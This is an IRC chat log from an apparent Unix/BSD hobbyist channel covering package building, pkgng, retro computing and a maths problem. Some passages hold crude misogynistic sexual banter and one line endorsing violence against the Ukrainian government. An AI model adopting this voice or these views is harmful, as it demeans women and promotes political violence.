11:19         yrmt │  the package won't create because the erlang makefile uses a weird strip command
11:19         yrmt │  strip: symbols referenced by relocation entries that can't be stripped in: /Volumes/Backup/pkgsrc/work/lang/erlang/work/.destdir/usr/pkg/lib/erlang/lib/runtime_tools-1.8.10/priv/obj/dyntrace.o
11:19         yrmt │  aw shet
11:20      bottomy │  what's the strip command?
11:21         yrmt │  I'm looking in the source for makefiles
11:22      bottomy │  chances are you won't need it (most likely just doing it to reduce size, get rid of some external symbols; rather than to prevent any conflicting issues that may occur)
11:23         yrmt │  I know, but the package won't create if that command fails
11:23         yrmt │  I just have to make a patch in the port to remove stripping from the makefile
11:31        crshd │  'sup peeps? 
11:31         yrmt │  doing stuff
11:31         yrmt │  and shit

13:23       phyrne │  Funny how you're trying to say that drinking's retarded... yet, it seems that you think drinking is when you drink "a 10 glass of vodka to yourself" or "at least 10-12 beer".... that's not drinking, that's being a fucking idiot

14:18         yrmt │  paper and pen is best to take notes
14:19       phyrne │  Yup. Every time I make a mistake in Python, I write it down there :)
14:19      lidstah │  yeah, it helps me organize my thoughts
14:19         yrmt │  Oh, nice

14:21      lidstah │  then I often type it back using vimwiki and export it in html so documentation is easily accessible to colleagues and such
14:21       phyrne │  It's also my scrap-pad for jotting down ideas

15:37       Jeevus │  that's excellent that it'll have tiling now :D
15:37      lidstah │  yeah, xfce's nicer every new version. I often use it when I setup a linux partition on friend's computers :)

15:47       libbro │  Well, 2nd
15:47      lidstah │  they just liked speed, stability, and the fact they can do everything they did with windows without any major problems.

15:54         yrmt │  and supposedly a good one

15:55      lidstah │  ^^
15:55         yrmt │  what I like with xfce is they always keep BSD in mind
15:56         yrmt │  even if some of the tools will only compile wiht gmake :p

15:59         yrmt │  woah

16:14       zygotb │  Weights?
16:14       phyrne │  mmhhhmmm
16:15       phyrne │  With weights though, it's best to start at a weight much lower than your max, and go high reps
16:15       phyrne │  That's the warm up
16:15       zygotb │  Wow. I always stretched before and after, but after was when I'd really slow-count.
16:16         yrmt │  yay for windowmaekr
16:17       zygotb │  The idea was to flush the muscles to help alleviate lactic acid build up.

17:05         jmbi │  oh nice
17:06       zygotb │  I also installed it to an hdd partition, but learning how to set it up is easier if I can have another machine going so I can look for answers.
17:07         jmbi │  yup
17:07         jmbi │  that's generally what i do
17:07       zygotb │  I can barely use a phone anymore.

17:15         jmbi │  zygotb: are you not using pkgng?
17:15       zygotb │  I tried what Gary BSD used and I gert errors.
17:16         jmbi │  if you're on 10
17:16         jmbi │  just do "pkg update"
17:16       zygotb │  jmbi, I used to build everything from ports, so I know squat about pkgng.
17:16       phyrne │  Stop following what Gary says zygotb! He's a pleb
17:16         jmbi │  alright
17:16         jmbi │  well
17:16         jmbi │  "pkg update"
17:17       zygotb │  I did pkg update
17:17         jmbi │  "pkg search [blah]"
17:17         jmbi │  and "
17:17         jmbi │  "pkg install [blah]"
17:17       phyrne │  zygotb: You don't need to know anything about pkg :D That's the beauty
17:17         jmbi │  it's real easy 
17:17         jmbi │  ^

17:18       zygotb │  Small "x" ?
17:18         jmbi │  pkg install xorg-minimal
17:18         jmbi │  should do the trick
17:18       zygotb │  Thanks guys...
17:19         jmbi │  and you can install like a browser or something, so it takes care of some commonly-needed dependencies
17:19       zygotb │  I planned on only using xombrero.
17:20       zygotb │  Wow! It is fast.
17:21         jmbi │  yeah pkgng is great

00:31       zygotb │  When Hawaiians go visiting they always bear gifts.
00:31        dami0 │  because bringing beer when you're coming over is kind of a normal thing in places that aren't america 
00:32       zygotb │  Bringing beer when you're a drunk is normal.

01:35      lidstah │  :/
01:35      lidstah │  she really is into alcohol or only on some occasions? mind me if any indiscretion, I don't want to be impolite
01:36       zygotb │  She thought that I would kick his ass for no fucking reason... I told her that if I hurt babby daddy, then I hurt baby.
01:36       zygotb │  She's a binge drinker, just like me.

01:39       zygotb │  My drinking has been drastically reduced in the past year or so, but prior to that I was a daily drinker.
01:41       zygotb │  Lately I have a couple of beers on occasion, but nothing like I used to.
01:41      lidstah │  I know this feeling
01:42      lidstah │  nowadays, I limit myself to a beer (a nice one, though) a day. Only exception is on saturday evening, with friends: restaurant and some wine, then one or two beers in a nice pub.

01:43       zygotb │  It's taken me 50 years to get to this point, where I don't feel the need to kill my consciousness with booze.
01:44       zygotb │  I went out drinking last month, went to my 2 favorite bars...
01:44         yrmt │  :)
01:44      lidstah │  I understand the feeling, however. took me ten years here, but that was thanks to a nice girlfriend I almost stopped.
01:44      lidstah │  *that
01:45       zygotb │  I had 3 beers in the first bar, and 3 beers in the second. This is a feat which would have been unthinkable 10 years ago.
01:45      lidstah │  you'd had 10 beers in each, back in time, right?
01:45       zygotb │  My firends own both bars.
01:46       zygotb │  You got it.
01:46      lidstah │  doesn't help, I guess, 'bout the friends
01:47       zygotb │  Actually, it does, because they've made sure that I didn't kill myself, and, or, others, on numerous occasions.
01:47      lidstah │  yeah

02:08         BigE │  dont let the autism bite
02:08       zygotb │  Hehe
02:08         quit │  BigE
02:09      lidstah │  hehe, indeed
02:09      lidstah │  but I still am in love with this machine. I worked on it so much, back in time. That's why I keep it, it's the only machine I kept from the 90's
02:10       zygotb │  I still have my old netbook in a drawer somewhere.
02:12       zygotb │  I think my old Gateway 2000 got tossed out last month. It was in the pile of stuff I told my daughter was OK to get rid of.
02:13      lidstah │  hehe
02:13      lidstah │  Gateway2000
02:13        tbuck │  that was my first pc, some gateway with min 98
02:13        tbuck │  win*
02:13      lidstah │  this is a name from the graveyard, dude
02:13      lidstah │  don't invoke it :D
02:13       zygotb │  The good news is that they've taken care of the yard.
02:14       zygotb │  My 1st 486 cost me over $2k USD
02:15       zygotb │  I loved Windows For Work Groups 3.11.
02:16      lidstah │  hey, it was not so bad
02:16       zygotb │  MS-DOS 6.0
02:16      lidstah │  used it at friend's homes
02:17      lidstah │  the amiga shell was better (even the amigados one, not the kornshell one)
02:17      lidstah │  but well, it worked
02:17       zygotb │  I used to spend hours fooling with colorful batch files
02:18       zygotb │  ANSI.SYS escape sequences.
02:18       zygotb │  Custom colored prompt strings, etc.
02:18      lidstah │  :)
02:18       zygotb │  Then it was dBase.
02:19      lidstah │  I only recall configuring those damn hymem.sys and … darn, what was it called... EMMSYS.SYS or something like, for EMS memory needed in some games like tie fighter and such
02:19       zygotb │  EMM386
02:20      lidstah │  yeah
02:20      lidstah │  thanks :)
02:20      lidstah │  damn this was tricky, back in time
02:20       zygotb │  Did you ever use Qedit, from SemWare?
02:20       zygotb │  It's a text editor.
02:20      lidstah │  yeah
02:21       zygotb │  I absolutely loved that editor.
02:21      lidstah │  it was not that bad indeed. But I already was a vimmer so…
02:21      lidstah │  it was still far, far, far away from standard microsoft edit.com thingy
02:22       zygotb │  I had never used *nix at that time. 
02:22      lidstah │  (which was awful, although their qbasic thing was not that bad, quite efficient to learn some coding basis)
02:23       zygotb │  Yeah, I played with Qbasic too.
02:23      lidstah │  zygotb: nether I. the Amiga was just quite unixy in some ways, especially the shell
02:23       zygotb │  I liked the PLAY function.
02:24       zygotb │  EDIT.COM wasn't too bad for editing, but Qedit blew it outta the water.
02:24      lidstah │  didn't recall this one - but as I said, PCs were not my day to day computer back in time

02:25         join │  earsplit
02:25      lidstah │  I was playing with Amiga ReXX back in the days
02:25       zygotb │  From Qbasic I went to VBA (as it progressed) as well as Visual Basic, and Visual C Plus
02:26      lidstah │  which was really powerful too: you could apply scripts on any program that had a ReXX port
02:26       zygotb │  Cool.
02:26      lidstah │  like "for every file in my workbench drawer that ends in .jpg load it in personalpaint then apply this specific filter" and so on
02:26         jmbi │  shix_: hi
02:26       zygotb │  I also never got to play with a Commodore 64.
02:27       zygotb │  lidstah, Sounds interesting.
02:27      lidstah │  I'd like to have one here. This and an AppleII
02:27      lidstah │  zygotb: it was really well made
02:28      lidstah │  applications could communicate between each other with a ReXX port, and with the operating system too
02:28       zygotb │  I've seen some demoscene stuff done on Commodore 64... I was impressed.
02:29      lidstah │  this was really nice, alongside with datatypes, so every application could use datatypes to open datafiles (e.g: a word processor could open .jpg files as long as the datatype was here, and then you placed it like any element of text)
02:29       zygotb │  The DemoScene hackers did it mostly in assembler.
02:29      lidstah │  it was really powerful
02:30      lidstah │  yeah, it was easier for them to cope with OS limits (no memory protection ;))
02:30       zygotb │  I never did beat "The Prince of Persia."
02:30      lidstah │  usually, if you ran a demo from the workbench (the OS), you'll have to reboot once it finished
02:30      lidstah │  90% of times
02:31       zygotb │  Duke Nukem was one I loved, and beat.
02:31      lidstah │  because it had no memory protection and the demo just bypassed operating system when running
02:31  NeoTerra|AFK│  NeoTerra
02:31      lidstah │  zygotb: hehe, Duke
02:31       zygotb │  Ah, yeah, the demo *was* the objective.
02:31      lidstah │  one of my first LAN games :)
02:32      lidstah │  zygotb: yep, so it overwritten even kernel space
02:32       zygotb │  I'm talking the 2D Duke.
02:32      lidstah │  oops :)
02:32      lidstah │  never played them, sadly. I still remember rick dangerous, though
02:32      lidstah │  or turrican, or balck crypt, and my best game of all times: Frontier: Elite
02:33       zygotb │  I'm not much of a gamer anymore... Too cheap to pay for games. :D
02:34       zygotb │  Right about the time Doom came out is when I moved into the boonies.
02:34      lidstah │  I'm not that of a gamer here too. Although I like playing some FPSes or rpgs
02:34      lidstah │  i'm more a casual nowadays
02:34       zygotb │  No phone, no electricity, no cable, etc...
02:34      lidstah │  errf
02:34      lidstah │  hardcore way of life, dude
02:35       zygotb │  Yeah, I missed the explosion of the internet.
02:35         quit │  fdcl
02:35      lidstah │  lived like this between 2001-2005
02:35      lidstah │  so I saw the internet from 1995 to 2000
02:35      lidstah │  then came back
02:35      lidstah │  and holy shit
02:35      lidstah │  so much ads, what the fuck oO?
02:35      lidstah │  was the first thing I thought
02:35       zygotb │  But the wireless web finally caught up here back in 2005-2006.
02:36       zygotb │  My only connection option was a cell phone.
02:36      lidstah │  the second thing I did was setting up squid proxy and an exclusion list to get rid of all this crap
02:37      lidstah │  ouch
02:37       zygotb │  Ah... Like Conformal's "AdSuck?"
02:37      lidstah │  yeah ;)
02:37       zygotb │  Awesome!
02:38       zygotb │  You're way more advanced than I, but most here are.
02:38      lidstah │  that really was the first thing I did (after installing debian of course, firing up firefox 0.9, looking at all those moving shit everywhere on the web, then - just no.)
02:39      lidstah │  ads were already everywhere in 1997 and around
02:39      lidstah │  but they were not that invading
02:40       zygotb │  Oh yeah. Back in 93 the BBS' I frequented were already serving ads.
02:40      lidstah │  and it's worse nowadays, ads  with fucking sound (hey, dude, how dare you fuck up my Pink Floyd song with your shit dance?)
02:40      lidstah │  zygotb: he, BBSes :)
02:40       zygotb │  But the ads were mostly text or image based.
02:40      lidstah │  often hosted on miggy's ;)
02:41       zygotb │  What are miggy's?
02:41      lidstah │  same in the first years of the "web"
02:41      lidstah │  zygotb: nickname for amiga :)
02:41       zygotb │  Ah! LoL.
02:41      lidstah │  my miggy==my beloved amiga ;)
02:41       zygotb │  Roger that.
02:42      lidstah │  ads were in a banneer, no blinking shit, or in a sidebar. no sound. no videos. just a pic and a link, which was perfectly nice
02:43       zygotb │  I remember <MARQUEE> ads/etc
02:43      lidstah │  now, before reading an otherwise uninteresting article, I have to cope (without adblocking and such) one video with sound, blinking banneers with flash inside wanting me to buy a new car, and, worst of all
02:43         quit │  earsplit
02:43      lidstah │  the popup shit
02:44      lidstah │  the thing that pops up front of the article, either with an ad or "please, join our newsletter so we can spam you to hell"
02:44       zygotb │  Yeah, I hate sites that serve autoplay video and noise.
02:44      lidstah │  the guy who invented it should be burned to death on a public place
02:44      lidstah │  well, that's allegoric ;)
02:44       zygotb │  Nah.
02:44       zygotb │  LoL
02:45       zygotb │ has sites which serve autoplay music/etc
02:45       zygotb │  LoL
02:45      lidstah │  argl
02:46      lidstah │  I think that's the most hatefull thing: playing sounds in webads
02:46      lidstah │  I sometimes shut down adblocker to see
02:47       zygotb │  Luckily my sites are only visited by myself.
02:47      lidstah │ is listening to FLASHBALL13 mash-up 'panic circus' noizbastard remix
02:48      lidstah │  zygotb: hehe
02:48       zygotb │  No shit. I have a fresh install of Gewgull KROME and without any ad blocking YouTube is almost unbearable.
02:48      lidstah │  yeah
02:49      lidstah │  between 2000 and 2005, the 'net has become some marketing place
02:49      lidstah │  and nowadays… it's just horrible
02:49      lidstah │  as long as I can access usenet and IRC, I don't care that much
02:50       zygotb │  From 2005 til now, the net is a vast spy apparatus.
02:50      lidstah │  that was to be preseen
02:50      lidstah │  it was something that became evident in 2007
02:50       zygotb │  Where are you from, if you don't mind my asking. 
02:51      lidstah │  nowadays, if I need a technician
02:51      lidstah │  zygotb: I'm from France
02:51       zygotb │  Nice! [pun intended]
02:51      lidstah │  as a sysadmin, I'm not in charge of recruiting, but I always, always, stalks people who apply for an IT job where I work
02:51      lidstah │  If I find nothing, it's a good point
02:52       zygotb │  I would do the same.
02:52      lidstah │  if I find anything compromising, it won't influence my judgment
02:52       zygotb │  Depends
02:52      lidstah │  I don't care the guy was drunk last week
02:52       zygotb │  Right
02:52      lidstah │  nor if he was smoking a blunt with friends
02:52       zygotb │  Same
02:52      lidstah │  but if he's not able to protect his own privacy
02:53      lidstah │  how will he protects and secure the goddamn fucking network here? or worse, will he be a point of a failure?
02:53       zygotb │  Good point.
02:55      lidstah │  I hate stalking people, but sometimes, when I see a kilometer long CV with almost all technologies available from cisco to juniper, from ws2K12 to various BSD, from postfix to exchange, then I take for granted that the guy or gal should be able to manage its own privacy.
02:55      lidstah │  because he or she will have the privacy of a thousand users in its hands
02:57      lidstah │  that might seem a bit harsh, but I tend to be less favorable to people that expose to much of their private life without restrictions
02:58      lidstah │  then, it also depends of the technical knowledge(and half time people claim to be fluent, let's say with postfix, then you ask them the little boring question about reverse MX and such… oops)
03:00      lidstah │  and I won't talk about the cisco certified guys. Half time, they're good for setting up private networks. yeah, dude, now, let's talk about this MPLS thing.
03:01      lidstah │  end of rant :)
03:04       zygotb │  Well said. I agree.

03:07      lidstah │  in france we call it a "DSI": Directeur des Systèmes d'Information (IT manager, if you want)
03:07      lidstah │  but I also do some helpdesk, manage software transitions/deployments, hardware upgrades, and so on

03:38     NeoTerra │  no one get's blown up
03:38         BigE │  i think mentioning hurd is one of our bannable rules, isnt it?
03:38     NeoTerra │  it most certainly is not :P
03:38         shix │  NeoTerra: they have some pretty realistic training now
03:38         jmbi │  lel

03:38    hadenodom │  BigE: I'm going Air National Guard, so I don't think I'll be getting deployed for anything other than IT support
03:38         BigE │  well, i think it should be
03:39         shix │  hadenodom: i tried it for like 5 minutes
03:39         BigE │  hadenodom: its cool, i am considering joining the airforce or navy when i finish my degree
03:40         shix │  BigE: you'll be getting some in the navy

03:42       zygotb │  Air National Guard soldiers face danger in training as well as during deployments.
03:43         join │  earsplit
03:44       zygotb │  The latest deaths of soldiers from my area were due to an aircraft crash.
03:44     NeoTerra │  lul the village people
03:44    hadenodom │  well, yeah
03:44       zygotb │  No enemy contact.
03:44    hadenodom │  crashes happen
03:44       zygotb │  Accidents...
03:44      lidstah │  NeoTerra: :D
03:44       zygotb │  Equipment failures.
03:44         shix │  Just smoke meth before getting on so you're super focused
03:45    hadenodom │  I was going to do Para-Rescue and active dutybut I decided to go National Guard and just do IT Maintenance 
03:45         BigE │  i want to do navy shit cause they do all the cool research with communications and crypto and shit
03:45         shix │  plus all that butt sex
03:46       zygotb │  LoL
03:46       zygotb │  One track mind.
03:46     NeoTerra │  BigE there are CF ads for recruiting women all over the subway, so I'm sure they've got a spot for you
03:46      lidstah │  hadenodom: wise move
03:46     NeoTerra │  :P
03:46         shix │  lul
03:47    hadenodom │  Para-Rescue = you're better trained than the marines, but you're dropped in dangerous places to rescue people.  BONUS:  They send para-Rescue to pick up ISS Astronauts when they land in the ocean.  
03:47       zygotb │  Sounds like recruiter spiel.
03:47         BigE │  NeoTerra: i dont know, as a white middle class, educated male, i think affirmative action is going to fuck me
03:48       zygotb │  Only if you let it
03:48     NeoTerra │  I know BigE, the joke was that you'd fit right in because you're a woman
03:48         BigE │  i know that
03:48     NeoTerra │  but yeah, getting in might be tough, since we're not at war and all
03:48     NeoTerra │  budget cuts n shit
03:48         BigE │  shix: https://www.youtube.com/watch?v=UKV_-Xet1V0
03:48         BigE │  can i be like that?
03:48         BigE │  NeoTerra: then ill go in through academic enlistment
03:48       fenriz │  yo can anyone sign into github?
03:48      lidstah │  hadenodom: might be fun, but once you're out of duty, my guess is that might be hard to land a job
03:48       zygotb │  Canucks are still part of ISAF
03:48       fenriz │  it keeps redirected me to their homepage and prompting me to sign in
03:49         BigE │  the navy does graduate studies in exchange for time served and shit
03:49     NeoTerra │  true, although I'd rather work for private sector
03:49         BigE │  i didnt want to do that for my BSc, but i would do it for a masters
03:49     NeoTerra │  also my gf is here, don't wanna move away
03:49         BigE │  meh
03:49     NeoTerra │  >inb4 ball and chain jokes
03:49      lidstah │  hadenodom: whereas going IT in the navy, you'll have both formation and experience to land a nice job once out of the service (is that the good word for servicing X years in army?)
03:49         BigE │  in comms and crypto, which is what i want to do
03:50         BigE │  military training is like
03:50       zygotb │  Damn right... Stay with her as much as you can.
03:50         BigE │  the best thing ever
03:50         shix │  BigE: plus this https://www.youtube.com/watch?v=4g2gaCkuKLo
03:50    hadenodom │  lidstah: yeah, that's true.  I'm gonna get my certs and serve my 6 years, and when it's time to reenlist, I'll probably do a different career.  Do that every 6 years, and by the time I retire, I'll  have a nice collection of certs in all sorts of things.  
03:50         BigE │  lidstah: that is what my research has brought up
03:50         shix │  NeoTerra: lol, she's reading this?
03:51       zygotb │  hadenodom, smart.
03:51     NeoTerra │  shix no? why would she be?
03:51       zygotb │  Work the system, don't let the system work you.
03:52         shix │  NeoTerra: ah, thought she was like right next to you or something
03:52      lidstah │  Well, that's how it works here in France, as far as I know (only did my military service when I was 21 years old, 6 monthes. I hate weapons, but I had fun with the FAMAS, and with the PGM Hecate (yeah, pgm.))
03:52     NeoTerra │  no no lol
03:52         BigE │  shix: it doesnt matter, she cant read anyways
03:53         jmbi │  i would *never* let a girl i was interested in read this chat
03:53         BigE │  well fuck my life
03:53     NeoTerra │  I would, depending who was on
03:53       zygotb │  I can't get my ol lady to look at this chan
03:53     NeoTerra │  zygotb it's probably better that way lul
03:53         BigE │  i think i royally fucked that one up
03:54         jmbi │  i would be scared that she would see shix and leave me for him
03:54         shix │  lul
03:54    hadenodom │  I would never let a girl I was "interested in" read this chat, but my girlfriend has been dating me for one and a half years, so she's not surprised by anything anymore
03:54         shix │  Yes, she would just ride her scooter all the way to FL for me
03:54       zygotb │  ROFL!

03:55       zygotb │  The M4 carbine has a really light recoil.
03:55         jmbi │  hadenodom: lel
03:55         jmbi │  hadenodom: my ex would just break up with me if she read this place

03:57         jmbi │  yeah i feel like if i let her read this place you would be like, "you leave that christian bitch yet?"
03:57    hadenodom │  I think we've all dated girls who didn't really know us.  I know I have.  Most of the time, it was just a thing where we were both horny and hooked up and then tried to turn it into a relationship but were extremely incompatible so we just hobbled along keeping our inner personalities guarded
03:58    hadenodom │  goddamn that was fucking deep
03:58     yrmt|away│  yrmt
03:58         jmbi │  hadenodom: this latest girl i dated was like that for 3 months
03:58         jmbi │  then she explains to me all her emotional disorders and shit
03:59     NeoTerra │  >seriously dating in high school
03:59      lidstah │  jmbi: good luck with that ;)
03:59         BigE │  NeoTerra: >serious anything in high school
03:59         jmbi │  yeah, she dumped me anyways
03:59      lidstah │  wanted the love of your life? here is an half psychotic, half bipolar woman.
03:59     NeoTerra │  BigE good call
03:59         jmbi │  "I'm a Christian, you're not, go to hell"
03:59    hadenodom │  jmbi: wow, me and my last ex Ashley were like that and we lasted exactly 3 months
04:00         jmbi │  not even kidding, that's the last text she sent me
04:00         shix │  http://i.imgur.com/hFl6RRe.png women are waste of time anyways

04:00         BigE │  jmbi: i think god dumped you, and she has her head up his ass, so she sort of just got dragged along
04:00    hadenodom │  the other case was the girl I fingerbanged in church and then dated for two weeks when I was 18
04:00         jmbi │  lolol
04:00      lidstah │  jmbi: sorry, but… I can't retain myself laughing like a giggle
04:00    hadenodom │  then dumped because she was extremely dumb
04:00         jmbi │  lidstah: it's ok
04:00         jmbi │  i find it funny too
04:01         jmbi │  damn i'm fucking stupid sometimes
04:01         jmbi │  shix: or learn how to give yourself a blowjob
04:01         shix │  just break a couple ribs
04:01      lidstah │  jmbi: had a love affair with a bipolar woman too here. One day, it's paradise. Next day, she made my life a hell. switched like this during 3 monthes, I said goodbye.
04:02         jmbi │  lidstah: pretty much the same here, except i dealt with it for 2 years
04:02      lidstah │  oooch

04:03      lidstah │  dude, as we say in France: "il vaut mieux être seul que mal accompagné", in english "better be single than in a bad relationship"
04:03         shix │  NeoTerra: you just got lucky
04:03         shix │  either that or shes banging other dudes without you knowing

04:05      lidstah │  dunno how they did…
04:05     NeoTerra │  ever since ~grade 12 I've always been a long term relationship man
04:05     NeoTerra │  putting my dick in some strange chicks pussy seems weird to me
04:05     NeoTerra │  like if you're fucking a girl that you just met, imagine all the other guys who have been up in that
04:06     NeoTerra │  nasty
04:06      lidstah │  yeah, I understand. especially if you have a nice gf awaiting you, respect and such.
04:06    hadenodom │  Getting ready to boot GNU/Hurd...
04:06         jmbi │  my dick doesn't care
04:06         shix │  NeoTerra: i actually feel that way too
04:06         shix │  thats why virgins are best
04:06      lidstah │  hadenodom: gnu/hurd? in a vm, I hope :p
04:06         shix │  then after a long time fucking them, you convince them into anal, and repeat the process
04:06    hadenodom │  thats why virgins are so nice to fuck... if you can make sure to get away before they get your name/number.  because goddamn, virgins are clingly as all fuck
04:06    hadenodom │  lidstah: yep

04:09    hadenodom │  lidstah: virtualbox
04:10      lidstah │  hadenodom: care to hl me if it works? I should really try it again then.
04:10    hadenodom │  shix: the netinstall wouldn't work, so I downloaded the preinstalled img file and converted it to vdi and it works fine with virtualbox
04:10         join │  shix

07:52         BigE │  shix: idk, she decides that i am just too much of a nerd and when she dumps the butch asshole she wont be open to me?
07:52      jjumbii │  WOMEN ARE MORE THAN JUST MEAT
07:53       Rudolf │  jjumbii, are you some kind of feminist?
07:53         BigE │  and now that i have said that, she is suddenly a bit less enticing
07:53       Rudolf │  jjumbii, would you rather have a brand new shiny car
07:53       Rudolf │  or some heap of crap

13:15       phyrne │  yrmt: I've got a guest, yeah
13:15         yrmt │  try my infinality tutorial?

13:17     ampharos │  i dont get the hype for infinitality
13:17         yrmt │  it makes fonts look good
13:17     ampharos │  i think openbsd included it out of the box but i don't see the difference (it looks a bit worse? cant really tel)  so i leave it off
13:17         yrmt │  nah openbsd didn't
13:18        kirby │  Haha, what went on with UHGit?

13:22        kirby │  Meh, his choice I guess.
13:22        kirby │  But he wasn't expecting people to flock to it, we're a pretty small community anyway.
13:23       phyrne │  Yeah, perhaps could have waited a bit longer but.... I don't get why you'd need it, GH is just fine
13:23        kirby │  I said that when we were discussing making it UHGit, a few people said they didn't like GitHub.
13:25       phyrne │  They don't like GitHub? :S What's not to like! Madness. What about bitbucket? Or was it just purely that they wanted it private
13:26        kirby │  Not a clue.
13:26        kirby │  I'm fine with GitHub.
13:27       phyrne │  Same, it's great
13:27        venam │  Same
13:28       phyrne │  :)
13:28        venam │  at least it's a bit social
13:28       phyrne │  Yep
13:28        kirby │  You know I think that was one of the reasons someone was against it.
13:28       phyrne │  srsly?
13:28       phyrne │  That's ridiculous
13:28        kirby │  To grep!
13:28        venam │  but it's good for open source if it's social
13:28       phyrne │  I know it's cheesey, but it's such a good way of bringing devs together
13:29       phyrne │  Really easy to collaborate on projects with other people too
13:29       phyrne │  PR notifications for fuck
13:29       phyrne │  *s sake
13:29       phyrne │  :p

13:30        kirby │  It's fun to sit and browse around other projects I think.
13:30        venam │  ^ exactly
13:30         yrmt │  too bad it's hosted in the US
13:30       phyrne │  Yep, I've come across great stuff just by linking from other people's pages and projects
13:30       phyrne │  yrmt: Why? What's bad about that?
13:31         yrmt │  khorben doesn't like it

13:31        kirby │  Gah can't find the discussion, maybe it was on my other computer.
13:31       phyrne │  Well, fair enough I suppose
13:31         yrmt │  he wants EU based stuff
13:31        venam │  it's open source, there's nothing to hide
13:31         yrmt │  brb trying this font
13:31       phyrne │  Suppose that's why he hosts their own git server
13:31        venam │  or are you talking about private repos?
13:32       phyrne │  venam: Who knows. It's an open source project. So I can't imagine a justifyable reason for just wanting to host it in the EU

13:33       phyrne │  ampharos: Were you here last night when I mentioned about the Kung-Fury trailer?
13:33     ampharos │  and first two eps of archer - funny but awkward to watch with others
13:34       phyrne │  ampharos: You've got me in the mood, I shall watch it later
13:34        exaem │  I downloaded the 5 seasons of archer
13:34        exaem │  never watched it
13:34       phyrne │  ampharos: And yes, I fully agree with you on that. Did you know there's the entire 1st episode where Archer is replaced with a Raptor?
13:34       phyrne │  It's fucking amazing
13:34       phyrne │  exaem: You should, it's truly excellent

13:54         yrmt │  z3bra: it's simply w3m with image support 
13:54        z3bra │  ah
13:54        z3bra │  the problem is that it does not resize the images
13:55        z3bra │  My script wraps the w3mimgdisplay to display the image scaled to the termnal

16:36         yrmt │  The Ukrainian government illegally passed brutal legislation without following proper parliamentary procedure.
16:36         yrmt │  Since Ukraine has no independent judiciary to nullify the illegal laws, the Ukrainian people have a mandate to use violence against the government until said legislation is repealed.
16:36         yrmt │  If they don't riot, their civil rights will be stripped away and Ukraine will become a totalitarian police state.

16:50     NeoTerra │  gonna have to spend him some time hardening everything
16:51       phyrne │  Not that it's noted as a bannable offense: but his only motive of joining this chan is to aggrovate people

16:55       phyrne │  I wouldn't be against it. Though, that wouldn't circumvent the shitstorm that is "Rudolf's revenge" :/
16:56     NeoTerra │  I can block him on IRC, thing is if he starts DDoSing the server, our host will suspend us
16:56       phyrne │  Yeah exactly
16:56       Jeevus │  i'm fine with whatever, but i'm with phyrne that it probably won't stop his revenge or whatever
16:56       phyrne │  That's my point

17:54       phyrne │  hahaha
17:54     ne0phyte │  I'm really not sure what's more useful. first is for knowing exactly how much space there is, second is for perfectionists to place the window pixel perfect :D
17:55       libbro │  TIL that GNASH is partially funded by Lulu.com

17:56         yrmt │  brb
17:56        z3bra │  but using rows could be much much cleaner
17:56     ne0phyte │  second one: autowrap and/or manual linebreak with an added formattingcommand
17:57     ne0phyte │  those two are directly related. if you know the exact amount of chars you can format it accordingly before outputting
17:57        z3bra │  Ah, I was thinking about something like 9menu

17:58     ne0phyte │  so I could also use it as a multiline statusbar

18:00     ne0phyte │  so I can build a scrolling notification for example
18:00        z3bra │  Yeah me too
18:01     ne0phyte │  so I will add another command (like fg, bg using \f1 etc) for linebreak and use an actual \n for the end of a statusupdate
18:01        z3bra │  But how would you output "line 1" and "line 2" with a line break between them
18:01     ne0phyte │  so you pipe "\r\f1 Line 1 \x\f2 Line 2"
18:01     ne0phyte │  \x = the new command for the linebreak
18:02        z3bra │  Okaaaayy
18:02     ne0phyte │  got it now? :D
18:02        z3bra │  yeah ^^
18:02        z3bra │  why not \n then ?
18:02     ne0phyte │  that'd work too. I used \x so you wouldn't mistake it for the real linebreak char :D
18:03     ne0phyte │  I'll probably use "\n"
18:03        z3bra │  if you don't use echo -e, that'd be fine I guess ^^
18:04        z3bra │  that's good you started it
18:04        z3bra │  Can I see your work somewhere and clone it ?
18:05     ne0phyte │  I totally messed up the alignment function (partly because I was using vim lol). I'll push it once it's working and let you know
18:05     ne0phyte │  it's in a local repo atm
18:06        z3bra │  okay ^^

19:29         yrmt │  :(
19:29        dami0 │  ok, I presume you want to deduce volume from change in water level
19:29         BigE │  there is a project called FinalTerm that is really nice, and i would like to get behind, but it has way to many fucking obscure dependencies
19:29         yrmt │  yeah I saw it, fuck that
19:30        _pash │  dami0: nope, imagine its dipped into the sea, however we know a lot of parameters of the cylinder
19:30        dami0 │  ok, so the submerged area?
19:31        _pash │  dami0: like we know the angle at which it is dipped, we know the distanse from its bottom to the surface
19:31     ne0phyte │  is there some C library for basic config files (key=value)?
19:31        _pash │  dami0: well yeah need to calculate both area and volume
19:31        dami0 │  ah, okay
19:31         BigE │  ne0phyte: i too would like to know that
19:31        dami0 │  gonna get a book, hold on
19:31        _pash │  dami0: but it has to be with trapezium or simpsons rule
19:33         BigE │  i remember those from first year calculus
19:33        dami0 │  it's cool
19:33        dami0 │  that's just numerical integration
19:34        dami0 │  you can use trig to work out the proportion of a normal integrand
19:34        dami0 │ urges everyone to take a step back, he's gonna math this bitch up
19:34     ne0phyte │  hm dunno if the overhead is worth it
19:35        dami0 │  why not just use D[VALUE] at compile time and read them from file
19:35     ne0phyte │  I guess I'll stick to switches, writing a shellscript and adding that to PATH
19:36        tbuck │  speaking out my ass here, but is libconfig what youre looking for?
19:36     ne0phyte │  dami0: that's the point. it's something dynamic and I'd like to pass different config files

19:38        _pash │  dami0: lets start with volume, assuming i can calculate the total volume of the cylinder, how do i get to the submersged volume?

20:10         shix │  thats not too bad
20:12        _pash │  dami0: how did you start going about it?
20:12        dami0 │  working out the submerged proportion
20:12        dami0 │  then integrating circular segments 
20:13        _pash │  segments arent going to be exactly circular

20:14        dami0 │  I've got a formula for a segment area, all I need now is to put it in terms of the angle and height of sumbersion
20:16        _pash │  alright, how did you work the submerged proportion?
20:16        _pash │  dami0: you realise you are making my day right now, because i've been thinking aboutit for like 5 hours today
20:17        dami0 │  basically, I'm working out the height in y axis of the cylinder
20:17        dami0 │  and adding the hemispheres on top
20:18        dami0 │  you can use the face that between -pi/2 to pi/2 the hemisphere is always gonna have the x-axis be tangential
20:18        dami0 │  then it's integrating semicircles with respect to the angle
20:18        dami0 │  the cylinder you need to integrate the segments by seeing how much of it is cut up by sea level

20:40       fenriz │  2is that sfw?
20:40       fenriz │  bored as fuck in class and would love to open that link if it is funny :P
20:40        dami0 │  the ones to remember are mainly H = 2r + xsin(pheta + phi), 
20:40        dami0 │  nah, it's just dry ass maths
20:41        tbuck │  fenriz: just dont open anything shix links
20:41       fenriz │  hahaha
